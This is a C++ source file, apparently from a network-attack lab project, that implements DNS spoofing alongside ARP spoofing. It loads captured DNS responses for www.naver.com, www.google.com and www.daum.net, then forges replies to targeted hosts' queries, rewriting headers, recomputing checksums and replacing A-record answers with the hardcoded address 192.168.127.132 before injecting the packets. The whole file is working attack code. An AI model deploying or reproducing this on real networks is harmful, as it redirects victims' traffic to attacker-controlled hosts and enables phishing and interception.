#include "dns_spoof.hpp"
#include "arp_spoof.hpp"
#include "network_utils.hpp"
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <iostream>
#include <arpa/inet.h>
#include <string>
#include <vector>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <memory>

#define DNS_PORT 53

using namespace std;

vector<vector<uint8_t>> dns_template_naver;
vector<vector<uint8_t>> dns_template_google;
vector<vector<uint8_t>> dns_template_daum;

bool load_dns_response_template(const char* filename, vector<vector<uint8_t>>& templates) 
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap_handle = pcap_open_offline(filename, errbuf);
    if (!pcap_handle) 
    {
        cerr << "pcap 파일 열기 실패: " << errbuf << endl;
        return false;
    }

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;
    while ((res = pcap_next_ex(pcap_handle, &header, &packet)) >= 0) 
    {
        if (res == 0 || header->caplen < 14) continue;

        const ether_header* eth_hdr = reinterpret_cast<const ether_header*>(packet);
        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) continue;

        const ip_header* ip_hdr = reinterpret_cast<const ip_header*>(packet + 14);
        int ip_header_len = (ip_hdr->ip_vhl & 0x0f) * 4;
        if (ip_hdr->ip_p != IPPROTO_UDP) continue;

        const udp_header* udp_hdr = reinterpret_cast<const udp_header*>(packet + 14 + ip_header_len);
        if (ntohs(udp_hdr->uh_sport) != DNS_PORT) continue;

        templates.emplace_back(packet, packet + header->caplen);
    }

    pcap_close(pcap_handle);
    if (!templates.empty()) 
    {
        cout << filename << " 로부터 DNS 응답 템플릿 " << templates.size() << "개 로드 완료" << endl;
        return true;
    } 
    else 
    {
        cerr << "DNS 응답 패킷 찾지 못함: " << filename << endl;
        return false;
    }
}

bool initialize_dns_templates() 
{
    bool success = true;
    if (!load_dns_response_template("data/dns_naver2.pcapng", dns_template_naver)) success = false;
    if (!load_dns_response_template("data/dns_google2.pcapng", dns_template_google)) success = false;
    if (!load_dns_response_template("data/dns_daum2.pcapng", dns_template_daum)) success = false;
    return success;
}

string extract_domain_name(const uint8_t* dns_data, size_t dns_len) 
{
    string domain;
    size_t pos = 12;
    while (pos < dns_len) 
    {
        uint8_t len = dns_data[pos];
        if (len == 0) break;
        if (!domain.empty()) domain.push_back('.');
        pos++;
        for (int i = 0; i < len && pos < dns_len; i++, pos++) 
        {
            domain.push_back(dns_data[pos]);
        }
    }
    return domain;
}

void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_packet_len,
                             const u_int8_t* attacker_mac, const u_int8_t* gateway_ip,
                             const string& domain,
                             const vector<unique_ptr<SpoofTarget>>& targets) 
{
    const int eth_len = 14;
    const ip_header* ip = (ip_header*)(orig_packet + eth_len);
    int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
    const udp_header* udp = (udp_header*)(orig_packet + eth_len + ip_header_len);
    const dns_header* dns = (dns_header*)(orig_packet + eth_len + ip_header_len + sizeof(udp_header));

    const vector<vector<uint8_t>>* dns_templates = nullptr;
    if (domain == "www.naver.com") dns_templates = &dns_template_naver;
    else if (domain == "www.google.com") dns_templates = &dns_template_google;
    else if (domain == "www.daum.net") dns_templates = &dns_template_daum;

    if (!dns_templates || dns_templates->empty()) {
        cerr << "[" << domain << "] DNS 템플릿 없음. 전송 생략.\n";
        return;
    }

    for (const auto& template_pkt : *dns_templates)
    {
        vector<uint8_t> spoof_packet = template_pkt;
        ether_header* eth_resp = (ether_header*)spoof_packet.data();
        ip_header* ip_resp = (ip_header*)(spoof_packet.data() + eth_len);

        memcpy(eth_resp->ether_shost, attacker_mac, 6);
        u_int8_t requester_ip[4];
        memcpy(requester_ip, &ip->ip_src, 4);

        bool found = false;
        for (const auto& target : targets) 
        {
            if (ip_equals(requester_ip, target->get_ip())) 
            {
                memcpy(eth_resp->ether_dhost, target->get_mac(), 6);  
                found = true;
                cout << "[DNS 응답] → " << target->get_ip_str() << ", MAC: " << mac_to_string(target->get_mac()) << "\n";
                break;
            }
        }
        if (!found) {
            cerr << "[DNS 응답] 대상 MAC 찾기 실패. 전송 생략.\n";
            continue;
        }

        ip_resp->ip_src = ip->ip_dst;
        ip_resp->ip_dst = ip->ip_src;
        ip_resp->ip_id = htons(rand() % 65536);  // 랜덤 ID 부여
        ip_resp->ip_sum = 0;
        uint16_t* ip_words = (uint16_t*)ip_resp;
        unsigned long ip_sum = 0;
        for (int i = 0; i < ip_header_len / 2; i++) ip_sum += ntohs(ip_words[i]);
        while (ip_sum >> 16) ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
        ip_resp->ip_sum = htons(~ip_sum);

        udp_header* udp_resp = (udp_header*)(spoof_packet.data() + eth_len + ip_header_len);
        udp_resp->uh_sport = udp->uh_dport;
        udp_resp->uh_dport = udp->uh_sport;
        udp_resp->uh_sum = 0;

        dns_header* dns_resp = (dns_header*)(spoof_packet.data() + eth_len + ip_header_len + sizeof(udp_header));
        dns_resp->id = dns->id;

        const char* spoof_ip = "192.168.127.132";
        uint32_t new_ip;
        inet_pton(AF_INET, spoof_ip, &new_ip);

        uint8_t* dns_data = (uint8_t*)dns_resp;
        size_t dns_len = spoof_packet.size() - (eth_len + ip_header_len + sizeof(udp_header));
        uint8_t* current = dns_data + sizeof(dns_header);

        while (*current != 0 && (current - dns_data) < dns_len) current += 1 + *current;
        current += 5;

        for (int i = 0; i < ntohs(dns_resp->ancount); i++) 
        {
            if (current[0] == 0xC0) current += 2;
            else {
                while (*current != 0 && (current - dns_data) < dns_len) current += 1 + *current;
                current += 1;
            }

            uint16_t answer_type = (current[0] << 8) | current[1];
            uint16_t rdlength = (current[8] << 8) | current[9];
            size_t offset = (current - dns_data) + 10;

            if (answer_type == 1 && rdlength == 4 && offset + 4 <= dns_len) {
                memcpy(dns_data + offset, &new_ip, 4);
            } 
            // google templete에서 문제가 생김, RData Reset ㄴㄴ
            // else if (answer_type == 65 && offset + rdlength <= dns_len) {
            //     memset(dns_data + offset, 0x00, rdlength);
            // }

            current += 10 + rdlength;
        }

        if (pcap_sendpacket(handle, spoof_packet.data(), spoof_packet.size()) != 0)
        {
            cerr << "DNS 스푸핑 응답 전송 실패: " << pcap_geterr(handle) << "\n";
        }
        else
        {
            cout << "DNS 스푸핑 응답 전송 완료 (" << domain << ")\n";
        }
    }
}